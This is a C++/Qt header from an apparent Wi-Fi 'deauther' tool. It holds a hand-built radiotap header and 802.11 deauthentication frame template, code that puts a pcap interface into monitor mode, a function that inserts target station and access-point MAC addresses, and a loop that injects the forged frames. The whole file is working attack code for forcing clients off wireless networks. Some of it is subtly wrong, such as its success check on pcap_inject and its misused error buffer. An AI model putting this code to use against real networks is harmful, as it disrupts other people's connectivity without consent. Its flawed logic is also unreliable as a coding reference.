#ifndef DEAUTHER_P_H
#define DEAUTHER_P_H

#include <QtGui>
#include <QListView>
#include <QMetaType>
#include <QPainter>
#include <QStyle>
#include <QStyledItemDelegate>
#include <QWidget>

#include "deauther.h"
#include "ui_deauther.h"


#define RADIOTAP_SIZE 13
const unsigned char radiotap_h[RADIOTAP_SIZE] = {
    /*  0 - 1  */ 0x00, 0x00,               // <-- radiotap version + pad byte
    /*  2 - 3  */ 0x0d, 0x00,               // <- radiotap header length
    /*  4 - 7  */ 0x04, 0x80, 0x02, 0x00,   // <-- bitmap
    /*  8 - 9  */ 0x02, 0x00,               // <-- rate (in 500kHz units)
    /* 10 - 11 */ 0x00, 0x00,               // <-- tx flags
    /* 12      */ 0x00,                     //<-- retries
};

#define DEAUTH_SIZE 26
const unsigned char deauth_packet[DEAUTH_SIZE] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x3A, 0x01,                         // duration
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // st addr place holder
    /* 16 - 21 */ 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, // ap addr place holder
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
    /* 24 - 25 */ 0x07, 0x00                          // reason code (1 = unspecified reason)
};





class DeautherPrivate
{
public:
    DeautherPrivate ();

    void setup_reasons_list (Ui::Deauther *ui)
    {

    }


    bool create_monitorIface (QByteArray iface, Deauther *dd)
    {
        QByteArray error_buffer[PCAP_ERRBUF_SIZE];

        dd->iface_handle = pcap_create(iface.data(), error_buffer->data());

        if (dd->iface_handle == NULL)
        {
            qWarning() << "Warning: pcap_create failed with" << error_buffer->data();
            qWarning() << Qt::endl;
            return false;
        }

        // check if iface supports monitoring
        if (!pcap_can_set_rfmon (dd->iface_handle))
        {
            qInfo() << "Info: monitor mode is not supported for" << iface.data();
            qInfo() << Qt::endl;
            pcap_close (dd->iface_handle);
            return false;
        }

        // set handle to monitor mode
        if (pcap_set_rfmon (dd->iface_handle, 1))
        {
            qWarning() << "Warning: setting" << iface.data() << "to monitor mode failed";
            qWarning() << Qt::endl;
            pcap_close (dd->iface_handle);
            return false;
        }

        // avoid blocking pcap thread
        pcap_set_immediate_mode(dd->iface_handle, 1);
        pcap_set_timeout(dd->iface_handle, 500);
        pcap_setdirection(dd->iface_handle, PCAP_D_INOUT);

        // activate new monitor iface
        if (pcap_activate (dd->iface_handle))
        {
            qWarning() << "Warning: Creating monitoring interface for"
                       << iface.data() << "failed" << Qt::endl
                       << "Do you have permissions?" << Qt::endl;
            pcap_close (dd->iface_handle);
            return false;
        }

        if (dd->iface_handle != NULL)
        {
            return true;
        }

        return false;
    }


    QByteArray create_deauthPacket (QByteArray stmac,
                                    QByteArray bssid,
                                    QByteArray reason)
    {


        QByteArray deauth_pk = QByteArray::fromRawData
                (reinterpret_cast<const char*>(radiotap_h), RADIOTAP_SIZE);

        deauth_pk.append(reinterpret_cast<const char*>(deauth_packet), DEAUTH_SIZE);

        deauth_pk.replace(RADIOTAP_SIZE+4, 6, bssid); //17
        deauth_pk.replace(RADIOTAP_SIZE+10, 6, stmac); //23
        deauth_pk.replace(RADIOTAP_SIZE+16, 6, bssid); //29
        deauth_pk.replace(RADIOTAP_SIZE+24, 1, reason); // 37

        return deauth_pk;
    }


    void send_packet (QByteArray packet, int size, int count, Deauther *dd)
    {
        const uchar* pk_data = reinterpret_cast<const uchar*>(packet.data());
        bool sent_packet = false;

        // send number of packets equal to count
        dd->station_mutex.lock();
        for (int i=0; i<count; ++i)
        {
            if(pcap_inject (dd->iface_handle, pk_data, size) == 0)
            {
                sent_packet = true;
            }
        }

        /* warning if all packets fail to send
        **
        ** some packets will inevitably fail
        */
        if (!sent_packet)
        {
            qWarning() << "Warning: failed to send 2GHz deauth packet";
            qWarning() << Qt::endl;
        }
        dd->station_mutex.unlock();
    }

};

#endif // STATION_MODEL_P_H
